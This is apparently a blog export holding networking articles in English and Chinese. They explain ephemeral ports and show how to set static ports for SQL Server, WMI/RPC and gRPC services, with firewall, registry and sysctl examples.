(e.g., 54321) Client wants to connect but doesn’t know which port to use Client must query a port mapper/endpoint mapper service to discover the port This adds complexity, latency, and potential failure points sequenceDiagram participant Client participant PortMapper as Port Mapper(Port 111) participant RPC as RPC Service(Port ???) Note over RPC: Starts on randomephemeral port 54321 RPC->>PortMapper: Register serviceon port 54321 Client->>PortMapper: Which port forservice X? PortMapper->>Client: Port 54321 Client->>RPC: Connect to 54321 Note over Client,RPC: ❌ Complex, fragile,firewall-unfriendly Problems with Dynamic Ports for Server Applications 1. Firewall Configuration Nightmare You must open the entire ephemeral port range (potentially 16,000+ ports) in firewalls, creating a massive security exposure. 2. Port Changes on Restart Every time the service restarts, it gets a different port. Connection strings, firewall rules, and monitoring tools must adapt dynamically. 3. Load Balancer Complexity Load balancers and proxies struggle with dynamic ports. They need static targets for health checks and routing. 4. Troubleshooting Difficulty When ports change constantly, diagnosing connection issues becomes significantly harder. Network traces and logs show different ports each time. 5. Security Audit Challenges Security teams can’t audit which services are exposed when ports change dynamically. Compliance requirements often mandate fixed, documented ports. Real-World Example: Microsoft SQL Server Named Instances Microsoft SQL Server provides a perfect example of why ephemeral ports cause problems and why static ports are the solution. The Problem with Dynamic Ports SQL Server named instances (e.g., SERVER\\INSTANCE1) use dynamic ports by default. When a named instance starts, it binds to an available ephemeral port. Clients discover this port by querying the SQL Server Browser service on UDP port 1434. sequenceDiagram participant Client participant Browser as SQL Browser(UDP 1434) participant Instance as SQL Instance(Dynamic Port) Note over Instance: Starts on randomport 49823 Instance->>Browser: Register onport 49823 Client->>Browser: Which port forINSTANCE1? Browser->>Client: Port 49823 Client->>Instance: Connect to 49823 Note over Client,Instance: ❌ Firewall nightmarePort changes on restart Why This Is Problematic Firewall Configuration: You must open UDP 1434 AND the entire ephemeral port range (49152-65535) in firewalls Security Risk: Opening thousands of ports increases attack surface Port Changes: The port changes every time the instance restarts Network Complexity: Load balancers and proxies struggle with dynamic ports Troubleshooting: Difficult to diagnose connection issues when ports keep changing The Solution: Static Port Configuration Configure named instances to use static ports, eliminating the need for port discovery. Step-by-Step Configuration: Open SQL Server Configuration Manager Navigate to SQL Server Network Configuration &gt; Protocols for [INSTANCE] Right-click TCP/IP &gt; Properties &gt; IP Addresses tab Scroll to IPAll section Set TCP Port to a static value (e.g., 1435) Clear TCP Dynamic Ports field (set to blank) Restart SQL Server instance 🎯 SQL Server Port Assignment StrategyAssign static ports systematically: Default instance: 1433 (standard) Named instance 1: 1434 Named instance 2: 1435 Named instance 3: 1436 Document port assignments in your infrastructure documentation. Connection String Changes &#x2F;&#x2F; Before (dynamic port - requires SQL Browser) string connString &#x3D; &quot;Server&#x3D;MYSERVER\\\\INSTANCE1;Database&#x3D;MyDB;&quot;; &#x2F;&#x2F; After (static port - no SQL Browser needed) string connString &#x3D; &quot;Server&#x3D;MYSERVER,1435;Database&#x3D;MyDB;&quot;; &#x2F;&#x2F; or string connString &#x3D; &quot;Server&#x3D;MYSERVER:1435;Database&#x3D;MyDB;&quot;; Firewall Configuration # Before: Must open UDP 1434 + entire ephemeral range New-NetFirewallRule -DisplayName &quot;SQL Browser&quot; -Direction Inbound -Protocol UDP -LocalPort 1434 -Action Allow New-NetFirewallRule -DisplayName &quot;SQL Dynamic Ports&quot; -Direction Inbound -Protocol TCP -LocalPort 49152-65535 -Action Allow # After: Only open the specific static port New-NetFirewallRule -DisplayName &quot;SQL INSTANCE1&quot; -Direction Inbound -Protocol TCP -LocalPort 1435 -Action Allow Benefits Comparison Configuration Dynamic Port Static Port Firewall Rules UDP 1434 + TCP 49152-65535 TCP 1435 only SQL Browser Required Not required Port Changes Every restart Never Security ❌ Large attack surface ✅ Minimal exposure Troubleshooting ❌ Complex ✅ Simple Load Balancer ❌ Difficult ✅ Easy Recommendation ❌ Avoid ✅ Always use ⚠️ Common MistakeAfter configuring static ports, many administrators forget to update connection strings. Clients will still try to use SQL Browser (UDP 1434) unless you explicitly specify the port in the connection string: ❌ Server=MYSERVER\\INSTANCE1 (still uses SQL Browser) ✅ Server&#x3D;MYSERVER,1435 (uses static port directly) Windows RPC and WMI: Configuring Static Ports Windows Management Instrumentation (WMI) and other Windows RPC services also suffer from dynamic port issues. By default, they use the entire ephemeral range, making firewall configuration challenging. The WMI Dynamic Port Problem WMI uses DCOM (Distributed COM), which relies on RPC. By default: Initial connection uses port 135 (RPC Endpoint Mapper) Actual WMI communication uses random ports from 49152-65535 Firewalls must allow the entire range for WMI to work sequenceDiagram participant Client participant EPM as Endpoint Mapper(Port 135) participant WMI as WMI Service(Dynamic Port) Client->>EPM: Request WMI endpoint EPM->>Client: Use port 52341 Client->>WMI: Connect to 52341 Note over Client,WMI: ❌ Requires opening49152-65535 in firewall Solution: Restrict RPC Dynamic Port Range Windows allows restricting RPC dynamic ports to a specific, smaller range: # Set RPC dynamic port range to 50000-50099 (100 ports) netsh int ipv4 set dynamicport tcp start&#x3D;50000 num&#x3D;100 netsh int ipv4 set dynamicport udp start&#x3D;50000 num&#x3D;100 # Verify settings netsh int ipv4 show dynamicport tcp netsh int ipv4 show dynamicport udp # Restart WMI service to apply changes Restart-Service Winmgmt -Force Configure WMI to Use Fixed Port For even tighter control, configure WMI to use a specific fixed port: # Set WMI to use fixed port 24158 winmgmt &#x2F;standalonehost # Configure DCOM port $reg &#x3D; [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey(&#39;LocalMachine&#39;, $env:COMPUTERNAME) $regKey &#x3D; $reg.OpenSubKey(&quot;SOFTWARE\\Microsoft\\Rpc\\Internet&quot;, $true) $regKey.SetValue(&quot;Ports&quot;, &quot;50000-50099&quot;, [Microsoft.Win32.RegistryValueKind]::MultiString) $regKey.SetValue(&quot;PortsInternetAvailable&quot;, &quot;Y&quot;, [Microsoft.Win32.RegistryValueKind]::String) $regKey.SetValue(&quot;UseInternetPorts&quot;, &quot;Y&quot;, [Microsoft.Win32.RegistryValueKind]::String) # Restart WMI Restart-Service Winmgmt -Force Firewall Configuration for WMI # Allow RPC Endpoint Mapper New-NetFirewallRule -DisplayName &quot;RPC Endpoint Mapper&quot; -Direction Inbound -Protocol TCP -LocalPort 135 -Action Allow # Allow restricted RPC dynamic port range New-NetFirewallRule -DisplayName &quot;RPC Dynamic Ports&quot; -Direction Inbound -Protocol TCP -LocalPort 50000-50099 -Action Allow # Allow WMI-In New-NetFirewallRule -DisplayName &quot;WMI-In&quot; -Direction Inbound -Program &quot;%SystemRoot%\\System32\\svchost.exe&quot; -Service Winmgmt -Action Allow ⚠️ Production ConsiderationsWhen restricting RPC port ranges: Test thoroughly in non-production environments first Ensure the range has enough ports for your workload Monitor for &quot;port exhaustion&quot; errors Document the configuration for future administrators Consider impact on other RPC-based services Solutions for RPC Services Beyond SQL Server and WMI, here are general solutions for any RPC service that needs to avoid ephemeral ports. 1. Use Fixed, Well-Known Ports The simplest and most reliable solution: assign your RPC service a fixed port number outside the ephemeral range. # gRPC example: Fixed port import grpc from concurrent import futures server &#x3D; grpc.server(futures.ThreadPoolExecutor(max_workers&#x3D;10)) server.add_insecure_port(&#39;[::]:50051&#39;) # Fixed port, not ephemeral server.start() # Kubernetes Service: Fixed port apiVersion: v1 kind: Service metadata: name: grpc-service spec: ports: - port: 50051 # Fixed port targetPort: 50051 protocol: TCP selector: app: grpc-server Benefits: Clients always know where to connect Firewall rules are straightforward No port discovery mechanism needed Works reliably across restarts 🎯 Port Selection for RPC ServicesChoose ports in the registered range (1024-49151) or coordinate with your organization: gRPC: Commonly uses 50051 Thrift: Often uses 9090 Custom RPC: Pick from 10000-49151 Avoid: 0-1023 (requires root), 49152+ (ephemeral range) 2. Use Service Discovery Modern microservice architectures use service discovery systems that abstract away port numbers entirely. # Consul service registration import consul c &#x3D; consul.Consul() c.agent.service.register( name&#x3D;&#39;my-rpc-service&#39;, service_id&#x3D;&#39;my-rpc-service-1&#39;, address&#x3D;&#39;10.0.1.5&#39;, port&#x3D;50051, tags&#x3D;[&#39;rpc&#39;, &#39;v1&#39;] ) # Clients discover the service services &#x3D; c.health.service(&#39;my-rpc-service&#39;, passing&#x3D;True) service_address &#x3D; services[1][0][&#39;Service&#39;][&#39;Address&#39;] service_port &#x3D; services[1][0][&#39;Service&#39;][&#39;Port&#39;] Service Discovery Options: Consul: Full-featured service mesh with health checking etcd: Distributed key-value store for service registration Kubernetes DNS: Built-in service discovery for K8s clusters Eureka: Netflix’s service registry ZooKeeper: Distributed coordination service 3. Use Load Balancers with Fixed Endpoints Place a load balancer in front of RPC services. The load balancer listens on a fixed port while backend services can use any port. # AWS Application Load Balancer for gRPC listener: port: 50051 protocol: HTTP2 targets: - target: backend-1:54321 # Backend can use any port - target: backend-2:54322 - target: backend-3:54323 4. Container Orchestration Port Mapping In containerized environments, map container ports to fixed host ports: # Docker Compose services: rpc-service: image: my-rpc-service ports: - &quot;50051:50051&quot; # Host:Container - both fixed # Kubernetes apiVersion: v1 kind: Pod metadata: name: rpc-service spec: containers: - name: rpc image: my-rpc-service ports: - containerPort: 50051 name: grpc RPC Best Practices Summary graph TB A([\"RPC Service Design\"]) --> B{Need externalaccess?} B -->|Yes| C([\"Use Fixed Port1024-49151\"]) B -->|No| D{Usingorchestration?} D -->|Yes| E([\"Use Service DiscoveryConsul/K8s DNS\"]) D -->|No| C C --> F([\"Configure Firewallfor Fixed Port\"]) E --> G([\"Let orchestratorhandle routing\"]) F --> H([\"✅ Clients connectreliably\"]) G --> H style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style E fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style H fill:#e3f2fd,stroke:#1976d2,stroke-width:2px Legacy RPC Systems Older RPC systems present special challenges due to their reliance on port mappers and dynamic ports. ⚠️ Legacy RPC SystemsOlder RPC systems (Sun RPC, Microsoft RPC/DCOM) use port mappers and dynamic ports, creating security and firewall challenges: Sun RPC: Uses portmapper on port 111, services bind to random ports Microsoft RPC: Uses endpoint mapper on port 135, dynamic port range 49152-65535 NFS: Uses multiple services with dynamic ports Modern alternatives: Migrate to gRPC, Thrift, or REST APIs with fixed ports If migration isn't possible, use VPNs or restrict to internal networks Configure Windows RPC to use restricted port ranges (as shown above) Use application-level gateways that understand RPC protocols Advanced Tuning for High-Traffic Servers For servers making many outbound connections (which use ephemeral ports as clients), additional tuning may be necessary. Expand Ephemeral Port Range # Linux: Expand ephemeral port range sudo sysctl -w net.ipv4.ip_local_port_range&#x3D;&quot;10000 65535&quot; # Make permanent by adding to &#x2F;etc&#x2F;sysctl.conf echo &quot;net.ipv4.ip_local_port_range &#x3D; 10000 65535&quot; | sudo tee -a &#x2F;etc&#x2F;sysctl.conf ⚠️ Caution When Changing Port RangesBefore expanding the ephemeral port range: Verify no services listen on ports in the new range Update firewall rules to allow the expanded range Test thoroughly in non-production environments Document the change for future troubleshooting Optimize TIME_WAIT Duration Connections in TIME_WAIT state hold ephemeral ports for a period (typically 60-120 seconds). On high-traffic systems, this can cause port exhaustion. # Linux: Reduce TIME_WAIT duration (use cautiously) sudo sysctl -w net.ipv4.tcp_fin_timeout&#x3D;30 # Enable TIME_WAIT socket reuse sudo sysctl -w net.ipv4.tcp_tw_reuse&#x3D;1 ⚠️ TIME_WAIT Tuning RisksReducing TIME_WAIT duration can cause issues: Delayed packets from old connections may confuse new connections Only reduce if you're experiencing port exhaustion Monitor for connection errors after changes RFC 1323 recommends at least 60 seconds Conclusion: Static Ports for Server Applications While ephemeral ports work beautifully for client applications, server applications that need to be discoverable should always use static, well-known ports. This principle applies especially to: RPC services (gRPC, Thrift, custom RPC) Database named instances (SQL Server, Oracle) Windows services (WMI, DCOM) Any service requiring firewall rules Services behind load balancers By configuring static ports, you gain: Simplified firewall configuration: Open only specific ports, not entire ranges Improved security: Minimal attack surface with documented, auditable ports Easier troubleshooting: Consistent ports across restarts Better monitoring: Fixed targets for health checks and metrics Reliable connectivity: Clients always know where to connect The extra effort to configure static ports pays dividends in operational simplicity, security, and reliability. 💭 Final Thought&quot;Ephemeral ports are perfect for clients - temporary, automatic, invisible. But for servers, predictability trumps convenience. Static ports transform chaos into order, making your infrastructure manageable, secure, and reliable.&quot; Further Reading RFC 6335 - Internet Assigned Numbers Authority (IANA) Procedures for Port Number Management Microsoft SQL Server Network Configuration Windows RPC Dynamic Port Configuration gRPC Best Practices","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Infrastructure","slug":"Infrastructure","permalink":"https://neo01.com/tags/Infrastructure/"},{"name":"Security","slug":"Security","permalink":"https://neo01.com/tags/Security/"},{"name":"Networking","slug":"Networking","permalink":"https://neo01.com/tags/Networking/"},{"name":"RPC","slug":"RPC","permalink":"https://neo01.com/tags/RPC/"},{"name":"SQL Server","slug":"SQL-Server","permalink":"https://neo01.com/tags/SQL-Server/"}]},{"title":"理解临时端口：网络通信的隐形工作者","slug":"2025/08/Understanding_Ephemeral_Ports_Part1-zh-CN","date":"un66fin66","updated":"un22fin22","comments":true,"path":"/zh-CN/2025/08/Understanding_Ephemeral_Ports_Part1/","permalink":"https://neo01.com/zh-CN/2025/08/Understanding_Ephemeral_Ports_Part1/","excerpt":"揭开每个网络连接背后的隐形工作者。了解临时端口如何让你的计算机同时处理数百个连接。","text":"每次你打开网页、发送电子邮件或流媒体视频时，你的计算机都在执行一个小小的协调奇迹。在幕后，你的系统需要同时处理数十甚至数百个网络连接——每个连接都需要自己独特的&quot;地址&quot;，这样数据才知道要去哪里。但这里有个谜题：你的计算机只有一个 IP 地址。它如何追踪哪些数据属于哪个应用程序？ 答案在于一种叫做临时端口的东西——当你发起网络连接时，操作系统会自动分配的临时、短暂的端口号。它们是互联网的隐形工作者，按需创建，不再需要时就被丢弃，但对我们在线上做的一切都绝对必要。 把你的计算机想象成一栋拥有数千个信箱的大型公寓大楼。你的 IP 地址是大楼的街道地址，但每个应用程序都需要自己的信箱号码（端口）来接收邮件。临时端口就像是需要时出现、对话结束时消失的临时信箱。 什么是临时端口？ 临时端口是当你的应用程序发起对外网络连接时，操作系统自动分配的临时端口号。“临时”（ephemeral）这个词意味着&quot;持续很短的时间&quot;，这完美地描述了它们的本质——它们只在单一连接的持续时间内存在。 当你在浏览器中输入 URL 时，你的计算机需要建立与网页服务器的连接。服务器监听众所周知的端口（HTTP 通常是端口 80，HTTPS 是端口 443），但你的计算机需要自己的端口号来接收响应。你的操作系统会自动选择一个可用的临时端口——比如说端口 54321——并将其用于这个特定的连接。 sequenceDiagram participant Client as 你的计算机(IP: 192.168.1.100) participant OS as 操作系统 participant Server as 网页服务器(IP: 93.184.216.34) Client->>OS: 请求连接到example.com:443 OS->>OS: 分配临时端口(例如 54321) OS->>Server: 从192.168.1.100:54321连接到 93.184.216.34:443 Server->>OS: 响应到192.168.1.100:54321 OS->>Client: 将数据传递给浏览器 Note over OS: 连接结束 OS->>OS: 释放端口 54321以供重用 端口号范围 端口号范围从 0 到 65535，分为三个类别： 众所周知的端口（0-1023）：保留给系统服务和常见协议（HTTP、HTTPS、SSH、FTP） 注册端口（1024-49151）：由 IANA（互联网号码分配局）分配给特定应用程序 动态/私有端口（49152-65535）：官方的临时端口范围 📊 端口范围详情 Linux（旧版）：32768-61000（28,233 个端口） Linux（现代）：32768-60999（28,232 个端口） Windows：49152-65535（16,384 个端口）- 遵循 RFC 6335 FreeBSD：10000-65535（55,536 个端口） macOS：49152-65535（16,384 个端口）- 遵循 RFC 6335 (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_71de5a2c9')); var option = { \"title\": { \"text\": \"各操作系统的临时端口范围\" }, \"tooltip\": {}, \"xAxis\": { \"type\": \"category\", \"data\": [\"Linux (旧)\", \"Linux (新)\", \"Windows\", \"FreeBSD\", \"macOS\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"端口数量\" }, \"series\": [{ \"type\": \"bar\", \"data\": [28233, 28232, 16384, 55536, 16384], \"itemStyle\": { \"color\": \"#1976d2\" } }] }; chart.setOption(option); } })(); 临时端口如何运作 理解临时端口的生命周期有助于揭开网络通信的神秘面纱。让我们逐步了解当你访问网站时会发生什么。 连接生命周期 1. 应用程序发起连接 当你的浏览器想要获取网页时，它会要求操作系统建立与服务器的 TCP 连接。浏览器不会指定要使用哪个本地端口——它将该决定留给操作系统。 2. 操作系统分配临时端口 你的操作系统扫描其可用临时端口池，并选择一个目前未使用的端口。这在微秒内发生，对应用程序完全透明。 3. 连接建立 连接现在由四部分元组唯一识别： 源 IP（你计算机的 IP 地址） 源端口（临时端口） 目的地 IP（服务器的 IP 地址） 目的地端口（众所周知的端口，如 443） 4. 数据交换 在你的浏览器和服务器之间流动的所有数据都使用这个四部分标识符。当服务器发送数据回来时，它会将其定址到你的 IP 和特定的临时端口，确保它到达正确的应用程序。 5. 连接关闭 当通信结束时，操作系统会将临时端口标记为可重用。然而，通常会有一个短暂的等待期（TIME_WAIT 状态），以确保来自旧连接的延迟数据包不会到达并混淆使用相同端口的新连接。 stateDiagram-v2 [*] --> Available: 端口在池中 Available --> Assigned: 应用程序请求连接 Assigned --> Active: 连接建立 Active --> TimeWait: 连接关闭 TimeWait --> Available: 等待期到期 Available --> [*] note right of TimeWait 通常 30-120 秒 防止数据包混淆 end note 多个同时连接 你的计算机可以维持数千个同时连接，每个连接使用不同的临时端口。当你浏览现代网站时，你的浏览器可能会同时打开 20-50 个连接——一个用于 HTML，多个用于图片、样式表、JavaScript 文件和 API 调用。每个连接都获得自己的临时端口。 🌐 真实场景你打开这个博客网站。你的浏览器建立： 端口 54321 → neo01.com:443（主 HTML 页面） 端口 54322 → cdn.neo01.com:443（CSS 样式表） 端口 54323 → cdn.neo01.com:443（JavaScript 文件） 端口 54324 → images.neo01.com:443（标题图片） 端口 54325 → api.neo01.com:443（最新标题） 端口 54326 → ads.neo01.com:443（广告） 每个连接都是独立的，但都同时发生，每个都有自己的临时端口，确保数据到达正确的目的地。 什么使用临时端口？ 临时端口是几乎所有网络通信的基础。了解谁使用它们以及如何使用有助于你设计更好的系统并排除网络问题。 客户端应用程序 网页浏览器：每个 HTTP/HTTPS 请求都使用临时端口。现代浏览器为每个网站打开多个连接以进行并行下载，每个连接都需要自己的端口。 电子邮件客户端：检查电子邮件时，你的客户端使用临时端口连接到邮件服务器（SMTP、IMAP、POP3）。 数据库客户端：连接到数据库（MySQL、PostgreSQL、MongoDB）的应用程序为每个数据库连接使用临时端口。 API 客户端：进行 REST 或 GraphQL API 调用的微服务为每个请求使用临时端口。 SSH 和远程桌面：当你 SSH 到服务器或使用远程桌面时，你的客户端为连接使用临时端口。 服务器应用程序（对外连接） 虽然服务器在众所周知的端口上监听传入连接，但它们在进行对外连接时使用临时端口： 网页服务器：当你的网页服务器连接到数据库或外部 API 时，它使用临时端口。 代理服务器：转发代理在代表客户端连接到目的地服务器时使用临时端口。 负载均衡器：在将流量分配到后端服务器时，负载均衡器为每个后端的连接使用临时端口。 微服务：微服务架构中的服务间通信严重依赖临时端口。 系统服务 DNS 查询：当你的计算机解析域名时，它使用临时端口进行 DNS 查询。 NTP（网络时间协议）：时间同步使用临时端口查询时间服务器。 DHCP 客户端：获取 IP 地址时，DHCP 客户端使用特定端口，尽管不总是来自临时端口范围。 graph TB subgraph \"你的计算机\" Browser([\"🌐 网页浏览器\"]) Email([\"📧 电子邮件客户端\"]) App([\"📱 应用程序\"]) DB([\"🗄️ 数据库客户端\"]) end subgraph \"操作系统\" PortPool([\"临时端口池49152-65535\"]) end subgraph \"互联网\" WebServer([\"网页服务器:443\"]) MailServer([\"邮件服务器:993\"]) API([\"API 服务器:443\"]) Database([\"数据库:5432\"]) end Browser -->|端口 54321| PortPool Email -->|端口 54322| PortPool App -->|端口 54323| PortPool DB -->|端口 54324| PortPool PortPool -->|54321:443| WebServer PortPool -->|54322:993| MailServer PortPool -->|54323:443| API PortPool -->|54324:5432| Database style PortPool fill:#e3f2fd,stroke:#1976d2,stroke-width:3px 客户端应用程序的最佳实践 了解最佳实践有助于你构建健壮、可扩展的系统，有效处理网络连接。 1. 实现连接池 不要为每个请求创建新连接，而是通过连接池重用现有连接： # 示例：数据库连接池 from sqlalchemy import create_engine from sqlalchemy.pool import QueuePool # 使用连接池创建引擎 engine &#x3D; create_engine( &#39;postgresql:&#x2F;&#x2F;user:pass@localhost&#x2F;db&#39;, poolclass&#x3D;QueuePool, pool_size&#x3D;20, # 维持 20 个连接 max_overflow&#x3D;10, # 允许 10 个额外连接 pool_recycle&#x3D;3600 # 1 小时后回收连接 ) 连接池通过重用连接而不是为每个操作创建新连接，大幅减少临时端口的使用。 2. 使用 HTTP Keep-Alive 启用 HTTP keep-alive 以重用 TCP 连接进行多个 HTTP 请求： # 示例：使用 session 的 Python requests（keep-alive） import requests session &#x3D; requests.Session() # 多个请求重用相同的连接 response1 &#x3D; session.get(&#39;https:&#x2F;&#x2F;api.example.com&#x2F;users&#39;) response2 &#x3D; session.get(&#39;https:&#x2F;&#x2F;api.example.com&#x2F;posts&#39;) response3 &#x3D; session.get(&#39;https:&#x2F;&#x2F;api.example.com&#x2F;comments&#39;) 没有 keep-alive，每个请求都会创建新连接并使用新的临时端口。使用 keep-alive，一个连接处理多个请求。 3. 监控临时端口使用情况 追踪你的系统使用多少临时端口，特别是在高流量服务器上： # Linux：计算不同状态的连接 netstat -an | grep TIME_WAIT | wc -l # 检查当前的临时端口范围 cat &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_local_port_range # Windows：查看活动连接 netstat -ano | find &quot;ESTABLISHED&quot; &#x2F;c 📊 监控阈值当临时端口使用超过以下情况时设置警报： 警告：可用端口的 60% 严重：可用端口的 80% 这让你有时间在耗尽发生之前进行调查。 4. 正确配置防火墙规则 确保防火墙允许临时端口范围用于返回流量： # Linux iptables：允许已建立的连接 iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT # AWS Security Group：允许临时端口用于返回流量 # 入站规则：自定义 TCP，端口范围：32768-65535，源：0.0.0.0&#x2F;0 🔒 安全注意事项与状态防火墙规则结合时，允许临时端口不会造成安全风险。防火墙只允许从你的网络内部发起的连接的返回流量。 常见问题和故障排除 了解常见的临时端口问题有助于你快速诊断和解决网络问题。 端口耗尽 症状：应用程序无法建立新连接、&quot;无法分配请求的地址&quot;错误、超时。 诊断： # 按状态检查当前的连接 netstat -an | awk &#39;&#123;print $6&#125;&#39; | sort | uniq -c | sort -n # 找出使用最多连接的进程 netstat -anp | grep ESTABLISHED | awk &#39;&#123;print $7&#125;&#39; | cut -d&#39;&#x2F;&#39; -f1 | sort | uniq -c | sort -n 解决方案： 扩展临时端口范围 实现连接池 减少 TIME_WAIT 持续时间（谨慎） 启用 TCP 连接重用 水平扩展以分散负载 防火墙阻挡返回流量 症状：对外连接失败或超时，即使目的地可达。 诊断： # 使用 tcpdump 测试连接 sudo tcpdump -i any -n port 443 # 检查防火墙规则 sudo iptables -L -n -v 解决方案： 添加允许已建立连接的临时端口范围的规则 验证已启用状态防火墙检查 检查主机和网络防火墙 🔍 调试检查清单故障排除临时端口问题时： ✅ 检查可用的临时端口：cat /proc/sys/net/ipv4/ip_local_port_range ✅ 计算活动连接：netstat -an | wc -l ✅ 识别 TIME_WAIT 中的连接：netstat -an | grep TIME_WAIT | wc -l ✅ 验证防火墙规则允许临时端口范围 ✅ 检查应用程序连接池配置 ✅ 监控系统日志中的&quot;地址已在使用中&quot;错误 ✅ 查看最近的配置更改 接下来呢？ 在本文中，我们探讨了临时端口如何从客户端角度运作——你的应用程序如何使用它们来建立对外连接，以及如何优化它们的使用以获得更好的性能和可靠性。 但临时端口故事还有另一面：当服务器应用程序在临时端口范围内使用动态端口时会发生什么？这为可发现性、安全性和防火墙配置带来了独特的挑战。 在 Part 2 中，我们将深入探讨： 为什么 RPC 服务不应使用临时端口 服务器应用程序动态端口分配的问题 真实案例：Microsoft SQL Server 命名实例 如何配置静态端口而不是动态临时端口 Windows RPC 和 WMI 端口配置的最佳实践 延伸阅读 RFC 6335 - Internet Assigned Numbers Authority (IANA) Procedures for Port Number Management TCP/IP Illustrated, Volume 1: The Protocols Linux Network Administrator’s Guide","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Infrastructure","slug":"Infrastructure","permalink":"https://neo01.com/tags/Infrastructure/"},{"name":"Security","slug":"Security","permalink":"https://neo01.com/tags/Security/"},{"name":"Networking","slug":"Networking","permalink":"https://neo01.com/tags/Networking/"}],"lang":"zh-CN"},{"title":"Understanding Ephemeral Ports: The Invisible Workers of Network Communication","slug":"2025/08/Understanding_Ephemeral_Ports_Part1","date":"un66fin66","updated":"un33fin33","comments":true,"path":"2025/08/Understanding_Ephemeral_Ports_Part1/","permalink":"https://neo01.com/2025/08/Understanding_Ephemeral_Ports_Part1/","excerpt":"Uncover the invisible workers behind every network connection. Learn how ephemeral ports enable hundreds of simultaneous connections on your computer.","text":"Every time you open a web page, send an email, or stream a video, your computer performs a small miracle of coordination. Behind the scenes, your system needs to juggle dozens or even hundreds of simultaneous network connections - each one requiring its own unique “address” so data knows where to go. But here’s the puzzle: your computer only has one IP address. How does it keep track of which data belongs to which application? The answer lies in something called ephemeral ports - temporary, short-lived port numbers that your operating system assigns automatically whenever you initiate a network connection. They’re the invisible workers of the internet, created on demand and discarded when no longer needed, yet absolutely essential to everything we do online. Think of your computer as a massive apartment building with thousands of mailboxes. Your IP address is the building’s street address, but each application needs its own mailbox number (port) to receive its mail. Ephemeral ports are like temporary mailboxes that appear when needed and disappear when the conversation ends. What Are Ephemeral Ports? Ephemeral ports are temporary port numbers automatically assigned by your operating system when your application initiates an outbound network connection. The word “ephemeral” means “lasting for a very short time,” which perfectly describes their nature - they exist only for the duration of a single connection. When you type a URL into your browser, your computer needs to establish a connection to the web server. The server listens on a well-known port (typically port 80 for HTTP or 443 for HTTPS), but your computer needs its own port number to receive the response. Your operating system automatically picks an available ephemeral port - say, port 54321 - and uses it for this specific connection. sequenceDiagram participant Client as Your Computer(IP: 192.168.1.100) participant OS as Operating System participant Server as Web Server(IP: 93.184.216.34) Client->>OS: Request connection toexample.com:443 OS->>OS: Assign ephemeral port(e.g., 54321) OS->>Server: Connect from192.168.1.100:54321to 93.184.216.34:443 Server->>OS: Response to192.168.1.100:54321 OS->>Client: Deliver data to browser Note over OS: Connection ends OS->>OS: Release port 54321for reuse The Port Number Range Port numbers range from 0 to 65535, divided into three categories: Well-Known Ports (0-1023): Reserved for system services and common protocols (HTTP, HTTPS, SSH, FTP) Registered Ports (1024-49151): Assigned to specific applications by IANA (Internet Assigned Numbers Authority) Dynamic/Private Ports (49152-65535): The official ephemeral port range 📊 Port Range Details Linux (Older): 32768-61000 (28,233 ports) Linux (Modern): 32768-60999 (28,232 ports) Windows: 49152-65535 (16,384 ports) - follows RFC 6335 FreeBSD: 10000-65535 (55,536 ports) macOS: 49152-65535 (16,384 ports) - follows RFC 6335 (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_f434721b7')); var option = { \"title\": { \"text\": \"Ephemeral Port Ranges by Operating System\" }, \"tooltip\": {}, \"xAxis\": { \"type\": \"category\", \"data\": [\"Linux (Old)\", \"Linux (New)\", \"Windows\", \"FreeBSD\", \"macOS\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"Number of Ports\" }, \"series\": [{ \"type\": \"bar\", \"data\": [28233, 28232, 16384, 55536, 16384], \"itemStyle\": { \"color\": \"#1976d2\" } }] }; chart.setOption(option); } })(); How Ephemeral Ports Work Understanding the lifecycle of an ephemeral port helps demystify network communication. Let’s walk through what happens when you visit a website. The Connection Lifecycle 1. Application Initiates Connection When your browser wants to fetch a web page, it asks the operating system to establish a TCP connection to the server. The browser doesn’t specify which local port to use - it leaves that decision to the OS. 2. OS Assigns Ephemeral Port Your operating system scans its pool of available ephemeral ports and selects one that’s not currently in use. This happens in microseconds, completely transparent to the application. 3. Connection Established The connection is now uniquely identified by a four-part tuple: Source IP (your computer’s IP address) Source Port (the ephemeral port) Destination IP (the server’s IP address) Destination Port (the well-known port, like 443) 4. Data Exchange All data flowing between your browser and the server uses this four-part identifier. When the server sends data back, it addresses it to your IP and the specific ephemeral port, ensuring it reaches the correct application. 5. Connection Closes When the communication ends, the operating system marks the ephemeral port as available for reuse. However, there’s often a brief waiting period (TIME_WAIT state) to ensure no delayed packets from the old connection arrive and confuse a new connection using the same port. stateDiagram-v2 [*] --> Available: Port in pool Available --> Assigned: Application requestsconnection Assigned --> Active: Connectionestablished Active --> TimeWait: Connectionclosed TimeWait --> Available: Wait periodexpires Available --> [*] note right of TimeWait Typically 30-120 seconds Prevents packet confusion end note Multiple Simultaneous Connections Your computer can maintain thousands of simultaneous connections, each using a different ephemeral port. When you browse a modern website, your browser might open 20-50 connections simultaneously - one for the HTML, multiple for images, stylesheets, JavaScript files, and API calls. Each connection gets its own ephemeral port. 🌐 Real-World ScenarioYou open this blog website. Your browser establishes: Port 54321 → neo01.com:443 (main HTML page) Port 54322 → cdn.neo01.com:443 (CSS stylesheet) Port 54323 → cdn.neo01.com:443 (JavaScript file) Port 54324 → images.neo01.com:443 (header image) Port 54325 → api.neo01.com:443 (latest headlines) Port 54326 → ads.neo01.com:443 (advertisement) Each connection is independent, yet all happen simultaneously, each with its own ephemeral port ensuring data reaches the right destination. What Uses Ephemeral Ports? Ephemeral ports are fundamental to nearly all network communication. Understanding who uses them and how helps you design better systems and troubleshoot network issues. Client Applications Web Browsers: Every HTTP/HTTPS request uses an ephemeral port. Modern browsers open multiple connections per website for parallel downloads, each requiring its own port. Email Clients: When checking email, your client connects to mail servers (SMTP, IMAP, POP3) using ephemeral ports for each connection. Database Clients: Applications connecting to databases (MySQL, PostgreSQL, MongoDB) use ephemeral ports for each database 